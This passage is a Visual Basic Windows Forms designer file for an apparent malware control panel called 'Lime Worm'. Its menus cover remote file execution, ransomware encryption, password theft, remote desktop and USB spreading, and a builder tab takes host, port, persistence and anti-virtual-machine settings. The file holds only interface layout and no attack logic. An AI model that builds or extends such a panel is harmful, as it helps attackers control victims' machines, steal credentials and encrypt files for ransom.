<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RunAFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromDiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RansomwareToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.EncryptToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DecryptionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CheckFilesToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DetailsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotPCOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCRestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PCLogoutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ControllerOptionsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UpdateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DiskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FromURLToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BotColorToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.MAIN_TAB = New Server_0._4.CHTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.L1 = New System.Windows.Forms.ListView()
        Me.ID = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.IP = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.USER = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.EXE_NAME = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.VER = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.OS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.INDATE = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.AV = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Rans = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.USB = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.PING = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.L2 = New System.Windows.Forms.ListBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.ChSeparator1 = New Server_0._4.CHSeparator()
        Me.ChButton1 = New Server_0._4.CHButton()
        Me.ChGroupBox3 = New Server_0._4.CHGroupBox()
        Me.ANTI = New Server_0._4.CHCheckbox()
        Me.USB_CHK = New Server_0._4.CHCheckbox()
        Me.ChGroupBox2 = New Server_0._4.CHGroupBox()
        Me.DROP = New Server_0._4.CHOnOffBox()
        Me.PATH2 = New Server_0._4.CHTextbox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.PATH1 = New Server_0._4.CHCombobox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.EXE = New Server_0._4.CHTextbox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.ChGroupBox1 = New Server_0._4.CHGroupBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.HOST2 = New Server_0._4.CHTextbox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.PORT = New Server_0._4.CHTextbox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.HOST1 = New Server_0._4.CHTextbox()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.MAIN_TAB.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.StatusStrip1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.ChGroupBox3.SuspendLayout()
        Me.ChGroupBox2.SuspendLayout()
        Me.ChGroupBox1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.Color.Black
        Me.ContextMenuStrip1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
        Me.ContextMenuStrip1.DropShadowEnabled = False
        Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RunAFileToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem, Me.RansomwareToolStripMenuItem, Me.PasswordsToolStripMenuItem, Me.DetailsToolStripMenuItem, Me.BotPCOptionsToolStripMenuItem, Me.ControllerOptionsToolStripMenuItem, Me.BotColorToolStripMenuItem, Me.ToolStripSeparator1, Me.AboutToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.ShowImageMargin = False
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(193, 280)
        '
        'RunAFileToolStripMenuItem
        '
        Me.RunAFileToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem, Me.FromURLToolStripMenuItem1})
        Me.RunAFileToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RunAFileToolStripMenuItem.Name = "RunAFileToolStripMenuItem"
        Me.RunAFileToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.RunAFileToolStripMenuItem.Text = "Run a File"
        '
        'FromDiskToolStripMenuItem
        '
        Me.FromDiskToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.FromDiskToolStripMenuItem.Text = "From Disk"
        '
        'FromURLToolStripMenuItem1
        '
        Me.FromURLToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control
        Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
        Me.FromURLToolStripMenuItem1.Text = "From URL"
        '
        'RemoteDesktopToolStripMenuItem
        '
        Me.RemoteDesktopToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        '
        'RansomwareToolStripMenuItem
        '
        Me.RansomwareToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.EncryptToolStripMenuItem, Me.DecryptionToolStripMenuItem, Me.CheckFilesToolStripMenuItem})
        Me.RansomwareToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RansomwareToolStripMenuItem.Name = "RansomwareToolStripMenuItem"
        Me.RansomwareToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.RansomwareToolStripMenuItem.Text = "Ransomware"
        '
        'EncryptToolStripMenuItem
        '
        Me.EncryptToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem"
        Me.EncryptToolStripMenuItem.Size = New System.Drawing.Size(183, 30)
        Me.EncryptToolStripMenuItem.Text = "Encrypt"
        '
        'DecryptionToolStripMenuItem
        '
        Me.DecryptionToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DecryptionToolStripMenuItem.Name = "DecryptionToolStripMenuItem"
        Me.DecryptionToolStripMenuItem.Size = New System.Drawing.Size(183, 30)
        Me.DecryptionToolStripMenuItem.Text = "Decryption"
        '
        'CheckFilesToolStripMenuItem
        '
        Me.CheckFilesToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.CheckFilesToolStripMenuItem.Name = "CheckFilesToolStripMenuItem"
        Me.CheckFilesToolStripMenuItem.Size = New System.Drawing.Size(183, 30)
        Me.CheckFilesToolStripMenuItem.Text = "Check Files"
        '
        'PasswordsToolStripMenuItem
        '
        Me.PasswordsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PasswordsToolStripMenuItem.Name = "PasswordsToolStripMenuItem"
        Me.PasswordsToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.PasswordsToolStripMenuItem.Text = "Passwords"
        '
        'DetailsToolStripMenuItem
        '
        Me.DetailsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DetailsToolStripMenuItem.Name = "DetailsToolStripMenuItem"
        Me.DetailsToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.DetailsToolStripMenuItem.Text = "Details"
        '
        'BotPCOptionsToolStripMenuItem
        '
        Me.BotPCOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.PCRestartToolStripMenuItem, Me.PCShutdownToolStripMenuItem, Me.PCLogoutToolStripMenuItem})
        Me.BotPCOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.BotPCOptionsToolStripMenuItem.Name = "BotPCOptionsToolStripMenuItem"
        Me.BotPCOptionsToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.BotPCOptionsToolStripMenuItem.Text = "PC Options"
        '
        'PCRestartToolStripMenuItem
        '
        Me.PCRestartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCRestartToolStripMenuItem.Name = "PCRestartToolStripMenuItem"
        Me.PCRestartToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
        Me.PCRestartToolStripMenuItem.Text = "PC Restart"
        '
        'PCShutdownToolStripMenuItem
        '
        Me.PCShutdownToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCShutdownToolStripMenuItem.Name = "PCShutdownToolStripMenuItem"
        Me.PCShutdownToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
        Me.PCShutdownToolStripMenuItem.Text = "PC Shutdown"
        '
        'PCLogoutToolStripMenuItem
        '
        Me.PCLogoutToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.PCLogoutToolStripMenuItem.Name = "PCLogoutToolStripMenuItem"
        Me.PCLogoutToolStripMenuItem.Size = New System.Drawing.Size(203, 30)
        Me.PCLogoutToolStripMenuItem.Text = "PC Logout"
        '
        'ControllerOptionsToolStripMenuItem
        '
        Me.ControllerOptionsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem, Me.CloseToolStripMenuItem, Me.UninstallToolStripMenuItem})
        Me.ControllerOptionsToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.ControllerOptionsToolStripMenuItem.Name = "ControllerOptionsToolStripMenuItem"
        Me.ControllerOptionsToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.ControllerOptionsToolStripMenuItem.Text = "Worm Options"
        '
        'UpdateToolStripMenuItem
        '
        Me.UpdateToolStripMenuItem.BackColor = System.Drawing.SystemColors.Control
        Me.UpdateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DiskToolStripMenuItem, Me.FromURLToolStripMenuItem})
        Me.UpdateToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.UpdateToolStripMenuItem.Text = "Update"
        '
        'DiskToolStripMenuItem
        '
        Me.DiskToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.DiskToolStripMenuItem.Name = "DiskToolStripMenuItem"
        Me.DiskToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.DiskToolStripMenuItem.Text = "From Disk"
        '
        'FromURLToolStripMenuItem
        '
        Me.FromURLToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.FromURLToolStripMenuItem.Name = "FromURLToolStripMenuItem"
        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
        Me.FromURLToolStripMenuItem.Text = "From URL"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(163, 30)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'BotColorToolStripMenuItem
        '
        Me.BotColorToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.BotColorToolStripMenuItem.Name = "BotColorToolStripMenuItem"
        Me.BotColorToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.BotColorToolStripMenuItem.Text = "Worm Color"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(189, 6)
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(192, 30)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
        Me.NotifyIcon1.Text = "Lime Worm"
        Me.NotifyIcon1.Visible = True
        '
        'MAIN_TAB
        '
        Me.MAIN_TAB.Controls.Add(Me.TabPage1)
        Me.MAIN_TAB.Controls.Add(Me.TabPage2)
        Me.MAIN_TAB.Controls.Add(Me.TabPage3)
        Me.MAIN_TAB.Dock = System.Windows.Forms.DockStyle.Fill
        Me.MAIN_TAB.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.MAIN_TAB.GlowColor = System.Drawing.Color.Empty
        Me.MAIN_TAB.ItemSize = New System.Drawing.Size(80, 30)
        Me.MAIN_TAB.Location = New System.Drawing.Point(0, 0)
        Me.MAIN_TAB.Name = "MAIN_TAB"
        Me.MAIN_TAB.SelectedIndex = 0
        Me.MAIN_TAB.Size = New System.Drawing.Size(1549, 515)
        Me.MAIN_TAB.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.Black
        Me.TabPage1.Controls.Add(Me.PictureBox1)
        Me.TabPage1.Controls.Add(Me.StatusStrip1)
        Me.TabPage1.Controls.Add(Me.L1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 34)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(1541, 477)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Worms"
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.Black
        Me.PictureBox1.ErrorImage = Nothing
        Me.PictureBox1.InitialImage = Nothing
        Me.PictureBox1.Location = New System.Drawing.Point(1286, 306)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(247, 128)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 2
        Me.PictureBox1.TabStop = False
        Me.PictureBox1.Visible = False
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.Black
        Me.StatusStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1})
        Me.StatusStrip1.Location = New System.Drawing.Point(3, 444)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(1535, 30)
        Me.StatusStrip1.SizingGrip = False
        Me.StatusStrip1.TabIndex = 1
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Lime
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(180, 25)
        Me.ToolStripStatusLabel1.Text = "ToolStripStatusLabel1"
        '
        'L1
        '
        Me.L1.AutoArrange = False
        Me.L1.BackColor = System.Drawing.Color.Black
        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ID, Me.IP, Me.USER, Me.EXE_NAME, Me.VER, Me.OS, Me.INDATE, Me.AV, Me.Rans, Me.USB, Me.PING})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L1.ForeColor = System.Drawing.Color.Lime
        Me.L1.FullRowSelect = True
        Me.L1.Location = New System.Drawing.Point(3, 3)
        Me.L1.Name = "L1"
        Me.L1.OwnerDraw = True
        Me.L1.Size = New System.Drawing.Size(1535, 471)
        Me.L1.TabIndex = 0
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'ID
        '
        Me.ID.Text = " User ID "
        Me.ID.Width = 184
        '
        'IP
        '
        Me.IP.Text = " IP Address "
        Me.IP.Width = 132
        '
        'USER
        '
        Me.USER.Text = " User Name "
        Me.USER.Width = 127
        '
        'EXE_NAME
        '
        Me.EXE_NAME.Text = " File Name "
        '
        'VER
        '
        Me.VER.Text = " Version "
        '
        'OS
        '
        Me.OS.Text = " Operating System "
        Me.OS.Width = 200
        '
        'INDATE
        '
        Me.INDATE.Text = " Installation Date "
        Me.INDATE.Width = 164
        '
        'AV
        '
        Me.AV.Text = " Anti-Virus "
        '
        'Rans
        '
        Me.Rans.Text = " Ransomware Status "
        Me.Rans.Width = 205
        '
        'USB
        '
        Me.USB.Text = " USB Spread "
        '
        'PING
        '
        Me.PING.Text = " Ping "
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.Black
        Me.TabPage2.Controls.Add(Me.L2)
        Me.TabPage2.Location = New System.Drawing.Point(4, 34)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(1541, 477)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Logs"
        '
        'L2
        '
        Me.L2.BackColor = System.Drawing.Color.Black
        Me.L2.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.L2.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.L2.ForeColor = System.Drawing.Color.Lime
        Me.L2.FormattingEnabled = True
        Me.L2.ItemHeight = 22
        Me.L2.Items.AddRange(New Object() {"#Lime_Worm"})
        Me.L2.Location = New System.Drawing.Point(3, 3)
        Me.L2.Name = "L2"
        Me.L2.Size = New System.Drawing.Size(1535, 471)
        Me.L2.TabIndex = 0
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.Black
        Me.TabPage3.Controls.Add(Me.ChSeparator1)
        Me.TabPage3.Controls.Add(Me.ChButton1)
        Me.TabPage3.Controls.Add(Me.ChGroupBox3)
        Me.TabPage3.Controls.Add(Me.ChGroupBox2)
        Me.TabPage3.Controls.Add(Me.ChGroupBox1)
        Me.TabPage3.Location = New System.Drawing.Point(4, 34)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(1541, 477)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Builder"
        '
        'ChSeparator1
        '
        Me.ChSeparator1.Colors = New Server_0._4.Bloom(-1) {}
        Me.ChSeparator1.Customization = ""
        Me.ChSeparator1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChSeparator1.Image = Nothing
        Me.ChSeparator1.Location = New System.Drawing.Point(25, 277)
        Me.ChSeparator1.Name = "ChSeparator1"
        Me.ChSeparator1.NoRounding = False
        Me.ChSeparator1.Size = New System.Drawing.Size(1183, 23)
        Me.ChSeparator1.TabIndex = 9
        Me.ChSeparator1.Text = "ChSeparator1"
        Me.ChSeparator1.Transparent = False
        '
        'ChButton1
        '
        Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
        Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChButton1.Image = Nothing
        Me.ChButton1.Location = New System.Drawing.Point(837, 207)
        Me.ChButton1.Name = "ChButton1"
        Me.ChButton1.NoRounding = False
        Me.ChButton1.Size = New System.Drawing.Size(371, 54)
        Me.ChButton1.TabIndex = 8
        Me.ChButton1.Text = "B u i l d"
        Me.ChButton1.Transparent = False
        '
        'ChGroupBox3
        '
        Me.ChGroupBox3.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox3.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox3.Controls.Add(Me.ANTI)
        Me.ChGroupBox3.Controls.Add(Me.USB_CHK)
        Me.ChGroupBox3.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox3.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox3.Image = Nothing
        Me.ChGroupBox3.Location = New System.Drawing.Point(837, 20)
        Me.ChGroupBox3.Movable = True
        Me.ChGroupBox3.Name = "ChGroupBox3"
        Me.ChGroupBox3.NoRounding = False
        Me.ChGroupBox3.Sizable = True
        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 151)
        Me.ChGroupBox3.SmartBounds = True
        Me.ChGroupBox3.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox3.TabIndex = 7
        Me.ChGroupBox3.Text = "MISC"
        Me.ChGroupBox3.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox3.Transparent = False
        '
        'ANTI
        '
        Me.ANTI.BackColor = System.Drawing.Color.Transparent
        Me.ANTI.Checked = False
        Me.ANTI.ForeColor = System.Drawing.Color.Black
        Me.ANTI.Location = New System.Drawing.Point(19, 106)
        Me.ANTI.Name = "ANTI"
        Me.ANTI.Size = New System.Drawing.Size(214, 14)
        Me.ANTI.TabIndex = 8
        Me.ANTI.Text = "Anti Virtual Machine"
        '
        'USB_CHK
        '
        Me.USB_CHK.BackColor = System.Drawing.Color.Transparent
        Me.USB_CHK.Checked = False
        Me.USB_CHK.ForeColor = System.Drawing.Color.Black
        Me.USB_CHK.Location = New System.Drawing.Point(19, 62)
        Me.USB_CHK.Name = "USB_CHK"
        Me.USB_CHK.Size = New System.Drawing.Size(214, 14)
        Me.USB_CHK.TabIndex = 7
        Me.USB_CHK.Text = "USB Spread"
        '
        'ChGroupBox2
        '
        Me.ChGroupBox2.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox2.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox2.Controls.Add(Me.DROP)
        Me.ChGroupBox2.Controls.Add(Me.PATH2)
        Me.ChGroupBox2.Controls.Add(Me.Label5)
        Me.ChGroupBox2.Controls.Add(Me.PATH1)
        Me.ChGroupBox2.Controls.Add(Me.Label3)
        Me.ChGroupBox2.Controls.Add(Me.EXE)
        Me.ChGroupBox2.Controls.Add(Me.Label4)
        Me.ChGroupBox2.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox2.Image = Nothing
        Me.ChGroupBox2.Location = New System.Drawing.Point(431, 20)
        Me.ChGroupBox2.Movable = True
        Me.ChGroupBox2.Name = "ChGroupBox2"
        Me.ChGroupBox2.NoRounding = False
        Me.ChGroupBox2.Sizable = True
        Me.ChGroupBox2.Size = New System.Drawing.Size(371, 241)
        Me.ChGroupBox2.SmartBounds = True
        Me.ChGroupBox2.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox2.TabIndex = 5
        Me.ChGroupBox2.Text = "Persistence"
        Me.ChGroupBox2.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox2.Transparent = False
        '
        'DROP
        '
        Me.DROP.Checked = False
        Me.DROP.Location = New System.Drawing.Point(19, 49)
        Me.DROP.MaximumSize = New System.Drawing.Size(56, 24)
        Me.DROP.MinimumSize = New System.Drawing.Size(56, 24)
        Me.DROP.Name = "DROP"
        Me.DROP.Size = New System.Drawing.Size(56, 24)
        Me.DROP.TabIndex = 6
        Me.DROP.Text = "ChOnOffBox1"
        '
        'PATH2
        '
        Me.PATH2.BackColor = System.Drawing.Color.Transparent
        Me.PATH2.Colors = New Server_0._4.Bloom(-1) {}
        Me.PATH2.Customization = ""
        Me.PATH2.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._4.My.MySettings.Default, "path2", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.PATH2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.PATH2.Image = Nothing
        Me.PATH2.Location = New System.Drawing.Point(112, 180)
        Me.PATH2.MaxCharacters = 0
        Me.PATH2.Name = "PATH2"
        Me.PATH2.NoRounding = False
        Me.PATH2.Size = New System.Drawing.Size(241, 25)
        Me.PATH2.TabIndex = 0
        Me.PATH2.Text = Global.Server_0._4.My.MySettings.Default.path2
        Me.PATH2.Transparent = True
        Me.PATH2.UsePasswordMask = False
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.ForeColor = System.Drawing.Color.Lime
        Me.Label5.Location = New System.Drawing.Point(16, 187)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(94, 18)
        Me.Label5.TabIndex = 5
        Me.Label5.Text = "Sub Folder"
        '
        'PATH1
        '
        Me.PATH1.BackColor = System.Drawing.Color.Black
        Me.PATH1.BaseColour = System.Drawing.Color.Black
        Me.PATH1.BorderColour = System.Drawing.Color.DarkGreen
        Me.PATH1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.PATH1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.PATH1.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.PATH1.FontColour = System.Drawing.Color.Lime
        Me.PATH1.FormattingEnabled = True
        Me.PATH1.Items.AddRange(New Object() {"AppData", "Temp", "UserProfile"})
        Me.PATH1.Location = New System.Drawing.Point(112, 138)
        Me.PATH1.Name = "PATH1"
        Me.PATH1.Size = New System.Drawing.Size(176, 29)
        Me.PATH1.StartIndex = 0
        Me.PATH1.TabIndex = 4
        '
        'Label3
        '
